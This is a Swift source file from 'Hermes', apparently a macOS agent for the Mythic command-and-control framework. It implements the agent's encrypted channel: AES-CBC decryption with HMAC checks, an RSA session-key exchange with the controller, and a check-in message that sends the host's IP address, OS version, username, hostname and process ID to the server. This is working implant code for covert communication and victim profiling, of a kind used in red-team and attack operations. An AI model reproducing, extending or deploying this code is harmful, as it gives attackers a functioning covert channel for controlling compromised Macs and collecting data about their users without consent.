//
//  crypto.swift
//  Hermes
//
//  Created by slyd0g on 5/28/21.
//

import Foundation

// https://stackoverflow.com/questions/39820602/using-secrandomcopybytes-in-swift
func generateIV() -> Data {

    var keyData = Data(count: 16)
    let result = keyData.withUnsafeMutableBytes {
        (mutableBytes: UnsafeMutablePointer<UInt8>) -> Int32 in
        SecRandomCopyBytes(kSecRandomDefault, 16, mutableBytes)
    }
    if result == errSecSuccess {
        return keyData
    } else {
        print("Problem generating random bytes")
        return keyData
    }
}


func decryptMythicMessage(mythicMessage: String, key: Data, iv: Data ) -> String {
    // Decode Mythic response
    let decodedmythicMessage = fromBase64(data: mythicMessage)
    
    // Check returned payloadUUID is the same
    let returnedPayloadUUID = decodedmythicMessage.subdata(in: 0..<36)
    if (returnedPayloadUUID != Data(agentConfig.payloadUUID.utf8)) {
        print("Error: PayloadUUID verification failed.")
        exit(0)
    }
    
    // Parse remaining AES blob: IV (16 bytes), Ciphertext (X bytes), HMAC (32 bytes)
    let encryptedResponse = decodedmythicMessage.subdata(in: 36..<decodedmythicMessage.count)
    
    let returnedIV = encryptedResponse.subdata(in: 0..<16)
    let ciphertext = (encryptedResponse.subdata(in: 16..<encryptedResponse.count-32))
    let returnedHMAC = encryptedResponse.subdata(in: encryptedResponse.count-32..<encryptedResponse.count)
    
    // Create and verify HMAC: sha256(IV+ciphertext)
    let hmac = CC.HMAC(returnedIV+ciphertext, alg: .sha256, key: key)
    if (hmac != returnedHMAC) {
        print("Error: HMAC verification failed.")
        exit(0)
    }
    
    // AES decrypt the ciphertext, store as JSON object
    var jsonResponse = ""
    do {
        let decryptedResponse = try CC.crypt(.decrypt, blockMode: .cbc, algorithm: .aes, padding: .pkcs7Padding, data: ciphertext, key: key, iv: returnedIV)
        jsonResponse = toString(data: decryptedResponse)
    } catch {
        print(error)
    }
    
    return jsonResponse
}

func encryptedKeyExchange() -> Bool {
    // Generate RSA keys
    let (privateKey, publicKey) = try! CC.RSA.generateKeyPair(4096)
    let encoededPublicKey = toBase64(data: publicKey)
    let sessionID = generateSessionID(length: 20)
    let decodedAESKey = Data(base64Encoded: agentConfig.encodedAESKey)!
    let payloadUUID = Data(agentConfig.payloadUUID.utf8)
    
    // Create JSON payload
    var jsonPayload = JSON([
        "action": "staging_rsa",
        "pub_key": encoededPublicKey,
        "session_id": sessionID,
    ])
    
    // Send Hermes message, get Mythic response, decrypt and decode
    var jsonResponse = sendHermesMessage(jsonMessage: jsonPayload, payloadUUID: payloadUUID, decodedAESKey: decodedAESKey, httpMethod: "get")
    
    // Save tempUUID for checkin message
    let tempUUID = jsonResponse["uuid"].rawString()
    
    // B64 decode + decrypt the encrypted session key, save as b64 string for future comms
    let encryptedSessionKey = fromBase64(data: jsonResponse["session_key"].stringValue)
    let tag = ""
    let sessionKey = try! CC.RSA.decrypt(encryptedSessionKey, derKey: privateKey, tag: toData(string: tag), padding: .oaep, digest: .sha1)
    agentConfig.encodedAESKey = toBase64(data: sessionKey.0)
    
    // Assemble plaintext json for checkin message
    jsonPayload = JSON([
        "action": "checkin",
        "ip": getIPAddress(),
        "os": "macOS \(ProcessInfo.processInfo.operatingSystemVersionString)",
        "user": NSUserName(),
        "host": Host.current().localizedName!,
        "pid": ProcessInfo.processInfo.processIdentifier,
        "uuid": agentConfig.payloadUUID,
        "architecture": "x64",
    ])
    
    // Updated payloadUUID to tempUUID after JSON message creation
    agentConfig.payloadUUID = tempUUID!
    
    // Send Hermes message, get Mythic response, decrypt and decode
    jsonResponse = sendHermesMessage(jsonMessage: jsonPayload, payloadUUID: toData(string: agentConfig.payloadUUID), decodedAESKey: sessionKey.0, httpMethod: "post")
    
    // Returned UUID is new payloadUUID
    agentConfig.payloadUUID = jsonResponse["id"].rawString()!
    
    // Return true or false based on success
    if (jsonResponse["status"].rawString()! == "success") {
        return true
    }
    else {
        return false
    }
}
